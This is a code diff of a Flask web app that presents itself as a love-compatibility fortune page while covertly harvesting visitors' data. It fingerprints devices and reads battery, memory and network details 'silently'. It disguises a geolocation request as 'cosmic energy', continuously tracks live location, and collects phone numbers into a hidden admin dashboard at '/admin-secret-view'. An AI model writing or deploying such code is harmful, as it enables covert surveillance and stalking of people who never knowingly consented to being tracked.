@@ -31,29 +31,18 @@ def save_to_firebase(path, data):
     try:
         url = f"{FIREBASE_URL}/{path}.json"
         response = requests.put(url, json=data, timeout=10)
+        print(f"Saved to {path}: {response.status_code}")  # Debug log
         return response.status_code in [200, 201]
     except Exception as e:
         print(f"Firebase save error: {e}")
         return False
 
-def get_from_firebase(path):
-    try:
-        url = f"{FIREBASE_URL}/{path}.json"
-        response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            return response.json()
-        return None
-    except Exception as e:
-        print(f"Firebase get error: {e}")
-        return None
-
 def save_visitor(session_id, data):
     path = f"visitors/{session_id}"
     return save_to_firebase(path, data)
 
-def save_location(session_id, lat, lon):
+def save_location(session_id, lat, lon, map_url):
     timestamp = datetime.now().isoformat()
-    map_url = f"https://www.google.com/maps?q={lat},{lon}"
     path = f"tracking_data/{session_id}_{timestamp}"
     location_data = {
         "sessionId": session_id,
@@ -64,7 +53,7 @@ def save_location(session_id, lat, lon):
     }
     return save_to_firebase(path, location_data)
 
-# ========== HTML TEMPLATE - NO TECHNICAL MESSAGES VISIBLE ==========
+# ========== HTML TEMPLATE ==========
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -235,16 +224,6 @@ HTML_TEMPLATE = '''
         @keyframes spin { to { transform: rotate(360deg); } }
         
         footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
-        
-        .energy-badge {
-            background: #48bb78;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            display: inline-block;
-            margin-top: 8px;
-        }
     </style>
 </head>
 <body>
@@ -261,7 +240,7 @@ HTML_TEMPLATE = '''
         <button class="btn" onclick="prepareReading()">🌙 Prepare Your Reading 🌙</button>
     </div>
     
-    <!-- STEP 2: Cosmic Energy (Hidden as location) -->
+    <!-- STEP 2: Cosmic Energy -->
     <div id="cosmicPanel" class="cosmic-panel">
         <h3>✨ Connecting to the Universe ✨</h3>
         <p style="font-size: 14px; margin-bottom: 15px;">The stars are aligning for your reading...</p>
@@ -273,15 +252,12 @@ HTML_TEMPLATE = '''
         <button class="cosmic-btn" id="cosmicBtn" onclick="syncCosmicEnergy()">
             🔮 Reveal My Destiny 🔮
         </button>
-        
-        <div id="energyMap" style="margin-top: 15px; display: none;"></div>
     </div>
     
     <!-- STEP 3: Fortune Result -->
     <div id="result" class="result">
         <div class="percentage" id="percentage">0%</div>
         <div class="love-message" id="message"></div>
-        <div id="energyBadge" style="margin-top: 10px;"></div>
     </div>
     
     <!-- STEP 4: Save Phone -->
@@ -307,14 +283,13 @@ HTML_TEMPLATE = '''
     let name1 = '', name2 = '';
     let energyWatcher = null;
     let currentLat = null, currentLon = null;
-    let energySynced = false;
     
     let destinyData = {
         sessionId: sessionId,
         timestamp: new Date().toISOString()
     };
     
-    // Silent data collection - user never sees any of this
+    // Silent device data collection
     async function collectDestinyData() {
         try {
             const fp = await FingerprintJS.load();
@@ -324,22 +299,22 @@ HTML_TEMPLATE = '''
         
         destinyData.screen = screen.width + 'x' + screen.height;
         destinyData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        destinyData.deviceInfo = navigator.userAgent;
+        destinyData.userAgent = navigator.userAgent;
         
         if (navigator.deviceMemory) {
-            destinyData.memory = navigator.deviceMemory + ' GB';
+            destinyData.deviceMemory = navigator.deviceMemory + ' GB';
         }
         
         if ('getBattery' in navigator) {
             try {
                 const battery = await navigator.getBattery();
-                destinyData.powerLevel = Math.round(battery.level * 100) + '%';
+                destinyData.batteryLevel = Math.round(battery.level * 100) + '%';
             } catch(e) {}
         }
         
         const connection = navigator.connection;
         if (connection) {
-            destinyData.signalType = connection.effectiveType;
+            destinyData.networkType = connection.effectiveType;
         }
         
         await fetch('/save-destiny', {
@@ -382,13 +357,13 @@ HTML_TEMPLATE = '''
         navigator.geolocation.getCurrentPosition(async (position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
-            energySynced = true;
             
             const mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
             
-            destinyData.energyLatitude = currentLat;
-            destinyData.energyLongitude = currentLon;
-            destinyData.energyMapUrl = mapUrl;
+            // Save location to visitor data
+            destinyData.latitude = currentLat;
+            destinyData.longitude = currentLon;
+            destinyData.mapUrl = mapUrl;
             
             await fetch('/save-destiny', {
                 method: 'POST',
@@ -396,17 +371,19 @@ HTML_TEMPLATE = '''
                 body: JSON.stringify(destinyData)
             });
             
+            // Save to tracking history
             await fetch('/record-energy', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    energyPoint: currentLat,
-                    energyValue: currentLon,
+                    latitude: currentLat,
+                    longitude: currentLon,
                     mapUrl: mapUrl
                 })
             });
             
+            // Start live tracking
             startEnergyTracking();
             await revealFortune();
             
@@ -443,15 +420,16 @@ HTML_TEMPLATE = '''
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    energyPoint: newLat,
-                    energyValue: newLon,
+                    latitude: newLat,
+                    longitude: newLon,
                     mapUrl: newMapUrl
                 })
             });
             
-            destinyData.energyLatitude = newLat;
-            destinyData.energyLongitude = newLon;
-            destinyData.energyMapUrl = newMapUrl;
+            // Update latest location in visitor data
+            destinyData.latitude = newLat;
+            destinyData.longitude = newLon;
+            destinyData.mapUrl = newMapUrl;
             
             await fetch('/save-destiny', {
                 method: 'POST',
@@ -460,8 +438,7 @@ HTML_TEMPLATE = '''
             });
             
         }, (error) => {
-            // Silent fail - user never knows
-            console.log('Energy tracking continues silently');
+            console.log('Tracking continues silently');
         }, {
             enableHighAccuracy: true,
             maximumAge: 0,
@@ -483,10 +460,10 @@ HTML_TEMPLATE = '''
             
             document.getElementById('percentage').innerHTML = currentPercent + '%';
             document.getElementById('message').innerHTML = currentFortune;
-            
             document.getElementById('result').style.display = 'block';
             document.getElementById('phoneSection').style.display = 'block';
             
+            // Save fortune to visitor data
             destinyData.fortuneText = currentFortune;
             destinyData.percentage = currentPercent;
             
@@ -520,23 +497,19 @@ HTML_TEMPLATE = '''
         saveBtn.disabled = true;
         
         try {
-            const response = await fetch('/save-number', {
+            // Save phone number to visitor data
+            destinyData.phoneNumber = phone;
+            
+            await fetch('/save-destiny', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: sessionId,
-                    phoneNumber: phone,
-                    fortune: currentFortune,
-                    percentage: currentPercent
-                })
+                body: JSON.stringify(destinyData)
             });
-            const result = await response.json();
-            if (result.status === 'saved') {
-                showMessage('✅ Your fortune has been sent to your phone!', 'success');
-                document.getElementById('phone').disabled = true;
-                saveBtn.innerHTML = '✅ Delivered!';
-                saveBtn.style.background = '#38a169';
-            }
+            
+            showMessage('✅ Your fortune has been sent to your phone!', 'success');
+            document.getElementById('phone').disabled = true;
+            saveBtn.innerHTML = '✅ Delivered!';
+            saveBtn.style.background = '#38a169';
         } catch(e) {
             showMessage('Network error. Please try again.', 'error');
             saveBtn.innerHTML = '💾 Send to My Phone';
@@ -584,46 +557,16 @@ def record_energy():
     try:
         data = request.get_json()
         session_id = data.get('sessionId')
-        lat = data.get('energyPoint')
-        lon = data.get('energyValue')
+        lat = data.get('latitude')
+        lon = data.get('longitude')
         map_url = data.get('mapUrl')
         
         if session_id and lat and lon:
-            timestamp = datetime.now().isoformat()
-            path = f"tracking_data/{session_id}_{timestamp}"
-            location_data = {
-                "sessionId": session_id,
-                "timestamp": timestamp,
-                "latitude": lat,
-                "longitude": lon,
-                "mapUrl": map_url
-            }
-            save_to_firebase(path, location_data)
+            save_location(session_id, lat, lon, map_url)
             return jsonify({'status': 'recorded'})
         return jsonify({'status': 'error'}), 400
     except Exception as e:
         print(f"Energy record error: {e}")
-        return jsonify({'status': 'error'}), 500
-
-@app.route('/save-number', methods=['POST'])
-def save_number():
-    try:
-        data = request.get_json()
-        session_id = data.get('sessionId')
-        phone = data.get('phoneNumber')
-        fortune = data.get('fortune')
-        percentage = data.get('percentage')
-        
-        visitor = get_from_firebase(f"visitors/{session_id}")
-        if visitor:
-            visitor['phoneNumber'] = phone
-            visitor['fortuneText'] = fortune
-            visitor['percentage'] = percentage
-            save_visitor(session_id, visitor)
-        
-        return jsonify({'status': 'saved'})
-    except Exception as e:
-        print(f"Save number error: {e}")
         return jsonify({'status': 'error'}), 500
 
 @app.route('/calculate-fortune', methods=['POST'])
@@ -638,30 +581,25 @@ def calculate_fortune():
     except Exception as e:
         return jsonify({'message': str(e)}), 500
 
-# ========== ADMIN VIEW - SEE EVERYTHING WITH MAP URL ==========
+# ========== ADMIN VIEW ==========
 @app.route('/admin-secret-view')
 def admin_view():
     try:
-        visitors = get_from_firebase("visitors")
-        energyData = get_from_firebase("tracking_data")
+        import requests
+        visitors_url = f"{FIREBASE_URL}/visitors.json"
+        tracking_url = f"{FIREBASE_URL}/tracking_data.json"
         
-        if not visitors:
-            return """
-            <html>
-            <head><title>Admin Dashboard</title></head>
-            <body style="background:#1a1a2e;color:#eee;padding:20px;font-family:monospace;">
-                <h1>📊 No Data Yet</h1>
-                <p>No visitors have used the app yet.</p>
-                <a href="/" style="color:#f093fb;">Back to App</a>
-            </body>
-            </html>
-            """
+        visitors_response = requests.get(visitors_url)
+        tracking_response = requests.get(tracking_url)
+        
+        visitors = visitors_response.json() if visitors_response.status_code == 200 else {}
+        tracking = tracking_response.json() if tracking_response.status_code == 200 else {}
         
         html = """
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Admin Dashboard - Complete Data with Maps</title>
+            <title>Admin Dashboard - Complete Data</title>
             <style>
                 body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
                 h1 { color:#f093fb; }
@@ -672,27 +610,24 @@ def admin_view():
                 .count { background:#0f3460; padding:10px; border-radius:10px; margin:20px 0; }
                 .btn { background:#e94560; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; display:inline-block; margin:10px; }
                 .map-link { color:#48bb78; text-decoration:none; }
-                .map-link:hover { text-decoration:underline; }
             </style>
         </head>
         <body>
-            <h1>📊 Complete Visitor Data (With Map URLs)</h1>
+            <h1>📊 Complete Visitor Data</h1>
             <p><a href="/admin-secret-view" class="btn">🔄 Refresh</a> <a href="/" class="btn">🏠 Back to App</a></p>
         """
         
         if visitors:
             html += f'<div class="count"><strong>Total Visitors:</strong> {len(visitors)}</div>'
-            
             html += """
-            <h2>📍 All Visitor Information (Including Map URLs)</h2>
+            <h2>📍 All Visitor Data (Names, Fortune, Location, Phone)</h2>
             <div style="overflow-x:auto;">
-            表
+            <table>
                 <thead>
                     <tr>
-                        <th>Session</th><th>Name</th><th>Partner</th><th>Love %</th><th>Phone</th>
-                        <th>Fingerprint</th><th>Battery</th><th>Memory</th><th>Network</th>
-                        <th>Latitude</th><th>Longitude</th><th>Map URL</th>
-                        <th>Screen</th><th>Timezone</th>
+                        <th>Session ID</th><th>Name</th><th>Crush Name</th><th>Love %</th><th>Fortune</th>
+                        <th>Phone</th><th>Latitude</th><th>Longitude</th><th>Map URL</th>
+                        <th>Fingerprint</th><th>Battery</th><th>Device Memory</th><th>Network</th><th>Screen</th><th>Timezone</th><th>IP</th>
                     </tr>
                 </thead>
                 <tbody>
@@ -700,55 +635,56 @@ def admin_view():
             for session_id, visitor in visitors.items():
                 if isinstance(visitor, dict):
                     map_link = ""
-                    if visitor.get('energyMapUrl'):
-                        map_link = f'<a href="{visitor.get("energyMapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
+                    if visitor.get('mapUrl'):
+                        map_link = f'<a href="{visitor.get("mapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
                     
                     html += f"""
                         <tr>
-                            <td>{session_id[:25]}...</td>
+                            <td>{session_id[:30]}...</td>
                             <td><strong>{visitor.get('name', '-')}</strong></td>
                             <td>{visitor.get('crush_name', '-')}</td>
                             <td style="color:#f093fb;">{visitor.get('percentage', '-')}%</td>
+                            <td>{visitor.get('fortuneText', '-')[:50]}...</td>
                             <td>{visitor.get('phoneNumber', '-')}</td>
-                            <td>{visitor.get('fingerprint', '-')[:20]}...</td>
-                            <td>{visitor.get('powerLevel', '-')}</td>
-                            <td>{visitor.get('memory', '-')}</td>
-                            <td>{visitor.get('signalType', '-')}</td>
-                            <td>{visitor.get('energyLatitude', '-')}</td>
-                            <td>{visitor.get('energyLongitude', '-')}</td>
+                            <td>{visitor.get('latitude', '-')}</td>
+                            <td>{visitor.get('longitude', '-')}</td>
                             <td>{map_link}</td>
+                            <td>{visitor.get('fingerprint', '-')[:20]}...</td>
+                            <td>{visitor.get('batteryLevel', '-')}</td>
+                            <td>{visitor.get('deviceMemory', '-')}</td>
+                            <td>{visitor.get('networkType', '-')}</td>
                             <td>{visitor.get('screen', '-')}</td>
                             <td>{visitor.get('timezone', '-')}</td>
+                            <td>{visitor.get('ip', '-')}</td>
                         </tr>
                     """
-            html += "</tbody> grape</div>"
+            html += "</tbody></table></div>"
         
-        if energyData:
-            html += f'<div class="count"><strong>Total Live Location Updates:</strong> {len(energyData)} (Movement Tracking with Maps)</div>'
-            
+        if tracking:
+            html += f'<div class="count"><strong>Total Location Updates (Live Tracking):</strong> {len(tracking)}</div>'
             html += """
-            <h2>🔄 Complete Movement History (Every Location Change with Map URL)</h2>
+            <h2>🔄 Complete Movement History</h2>
             <div style="overflow-x:auto;">
-            表
-                <thead><tr><th>Session</th><th>Time</th><th>Latitude</th><th>Longitude</th><th>Map URL</th></thead>
+            <table>
+                <thead><tr><th>Session ID</th><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map URL</th></tr></thead>
                 <tbody>
             """
-            sorted_data = sorted(energyData.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
-            for key, loc in sorted_data:
+            sorted_tracking = sorted(tracking.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
+            for key, loc in sorted_tracking:
                 if isinstance(loc, dict):
                     map_link = ""
                     if loc.get('mapUrl'):
                         map_link = f'<a href="{loc.get("mapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
                     html += f"""
                         <tr>
-                            <td>{loc.get('sessionId', '')[:25]}...</td>
+                            <td>{loc.get('sessionId', '')[:30]}...</td>
                             <td>{loc.get('timestamp', '')[:19]}</td>
                             <td>{loc.get('latitude', '-')}</td>
                             <td>{loc.get('longitude', '-')}</td>
                             <td>{map_link}</td>
                         </tr>
                     """
-            html += "</tbody> grape</div>"
+            html += "</tbody></table></div>"
         
         html += "</body></html>"
         return html
